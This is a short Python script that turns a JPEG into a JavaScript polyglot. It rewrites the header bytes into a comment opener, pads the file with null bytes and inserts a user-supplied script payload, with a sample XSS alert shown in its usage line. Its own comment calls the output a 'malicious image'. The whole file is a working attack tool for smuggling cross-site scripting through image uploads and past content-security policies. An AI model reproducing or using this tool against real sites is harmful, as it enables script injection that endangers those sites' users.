#!/usr/bin/python3

import sys
import binascii
import numpy


try:
    filename = sys.argv[1]
    payload = sys.argv[2]
    injected_filename = sys.argv[3]
except:
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} test.jpg '*/=alert(\"XSS\");/*' injected.jpg")
        sys.exit(1)


def file_gen():

    f = open(filename, "rb")
    content = f.read()

    # hex gen
    hex_data = binascii.hexlify(content).decode('utf-8')

    # sub string of hex upto 40
    substr1 = hex_data[0:40]
    # replace header length to a comment hex value 
    edit_substr1 = substr1[:8] + "2f2a" + substr1[12:]


    # null bytes gen
    null_bytes = ["00"] * (12074 - 16 - len(payload))
    null_bytes = "".join(null_bytes)

    # payload convert to hex
    hex_payload = binascii.hexlify(payload.encode())
    hex_payload = hex_payload.decode('utf-8')

    # substr2 remaining hex in the image file
    substr2 = hex_data[40:len(hex_data)-10]


    # closing the comment
    substr2_slice = hex_data[len(hex_data)-10:len(hex_data)]
    edit_substr2 = substr2_slice[0:2] + "2a2f" + substr2_slice[6:]

    # combine whole gen hex data
    combine_hex_data = edit_substr1 + null_bytes + hex_payload + substr2 + edit_substr2

    # gen malicious image
    data = binascii.a2b_hex(combine_hex_data)
    with open(injected_filename, "wb") as img_f:
        img_f.write(data)


file_gen()
